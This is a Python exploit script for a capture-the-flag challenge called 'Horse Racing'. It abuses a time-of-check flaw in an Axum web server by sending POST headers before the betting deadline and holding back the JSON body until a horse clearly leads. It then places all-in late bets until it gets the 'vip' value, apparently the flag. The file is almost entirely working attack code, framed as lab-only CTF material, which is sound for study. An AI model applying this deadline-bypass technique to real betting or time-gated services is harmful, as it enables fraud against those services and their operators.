#!/usr/bin/env python3
"""Source-derived Horse Racing timing reproducer, not the archived live script.

The Axum middleware checks race time before Json<BetRequest> waits for the
request body. The client sends only headers before time 30 and sends the
80-byte JSON body after a strong leader emerges. All-in bets can lose.
Use in the CTF laboratory only.

    python3 delayed_bet.py --selftest
    python3 delayed_bet.py http://127.0.0.1:8080 --rounds 7
"""
import argparse
import json
import socket
import time
from urllib.parse import urlsplit
from urllib.request import urlopen

BODY_LENGTH = 80


def bet_body(horse, amount):
    if not (0 <= horse < 16 and amount >= 1):
        raise ValueError("Invalid horse index or bet amount")
    body = json.dumps({"horse": horse, "amount": amount},
                      separators=(",", ":")).encode()
    if len(body) > BODY_LENGTH:
        raise ValueError("Body exceeds Content-Length")
    return body.ljust(BODY_LENGTH, b" ")


def select_leader(state, minimum, lead):
    positions = state["horses"]
    if len(positions) != 16:
        raise ValueError("Expected sixteen horse positions")
    a, b = sorted(range(16), key=lambda k: positions[k], reverse=True)[:2]
    if (state["timer"] >= 30 and positions[a] >= minimum
            and positions[a] - positions[b] >= lead):
        return a
    return None


def get_state(base):
    with urlopen(base + "/api/state", timeout=4) as resp:
        return json.load(resp)


def open_headers(parsed):
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("A plain HTTP origin is required")
    conn = socket.create_connection((parsed.hostname, parsed.port or 80),
                                    timeout=6)
    conn.settimeout(8)
    conn.sendall((
        "POST /api/bet HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {BODY_LENGTH}\r\n"
        "Connection: close\r\n\r\n"
    ).encode())
    return conn


def send_body(conn, horse, stake):
    conn.sendall(bet_body(horse, stake))
    parts = []
    while True:
        try:
            packet = conn.recv(4096)
        except socket.timeout:
            break
        if not packet:
            break
        parts.append(packet)
    return b"".join(parts)


def wait_for_next_race(base, previous, timeout):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        state = get_state(base)
        if state["race_number"] > previous:
            return state
        time.sleep(0.3)
    raise TimeoutError("No subsequent race")


def play_round(base, parsed, minimum, lead, timeout):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        state = get_state(base)
        if state["user_points"] == 0:
            raise RuntimeError("No bankroll left after the previous all-in bet")
        if state["user_bet"] is None and 1 <= state["timer"] <= 24:
            break
        time.sleep(0.25)
    else:
        raise TimeoutError("No new betting window")

    race = state["race_number"]
    stake = state["user_points"]
    conn = open_headers(parsed)
    try:
        while time.monotonic() < deadline:
            state = get_state(base)
            if state["race_number"] != race or state["timer"] == 0:
                raise TimeoutError("Race ended before the bet was delivered")
            leader = select_leader(state, minimum, lead)
            if leader is not None and max(state["horses"]) < 95:
                response = send_body(conn, leader, stake)
                status = response.split(b"\r\n", 1)[0]
                print(f"race={race}, horse={leader}, stake={stake}, status={status!r}")
                if b" 200 " not in status:
                    raise RuntimeError(f"Bet rejected: {response[:250]!r}")
                return race
            time.sleep(0.25)
        raise TimeoutError("No sufficiently strong leader appeared")
    finally:
        conn.close()


def selftest():
    state = {"timer": 38, "horses": [0.0] * 16}
    state["horses"][7] = 54.0
    state["horses"][3] = 39.0
    assert select_leader(state, 50, 10) == 7
    assert select_leader(state, 60, 10) is None
    assert select_leader(dict(state, timer=29), 50, 10) is None
    body = bet_body(7, 320)
    assert len(body) == 80 and json.loads(body) == {"horse": 7, "amount": 320}
    print("SELFTEST PASS: leader thresholds and exact 80-byte JSON framing")


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("url", nargs="?", help="plain HTTP origin")
    p.add_argument("--rounds", type=int, default=7)
    p.add_argument("--minimum", type=float, default=50.0)
    p.add_argument("--lead", type=float, default=10.0)
    p.add_argument("--timeout", type=float, default=140.0)
    p.add_argument("--selftest", action="store_true")
    args = p.parse_args()
    if args.selftest:
        selftest()
        return
    if not args.url:
        p.error("Provide URL or --selftest")
    parsed = urlsplit(args.url)
    if parsed.scheme != "http" or parsed.path not in ("", "/"):
        p.error("Use a plain HTTP origin without a path")
    base = args.url.rstrip("/")
    for _ in range(args.rounds):
        state = get_state(base)
        if state["user_points"] >= 500:
            print(state["vip"])
            return
        previous = play_round(base, parsed, args.minimum, args.lead, args.timeout)
        after = wait_for_next_race(base, previous, args.timeout)
        print(f"after race {previous}: points={after['user_points']}")
    state = get_state(base)
    print(f"Stopped with {state['user_points']} points; VIP: {state['vip']}")


if __name__ == "__main__":
    main()
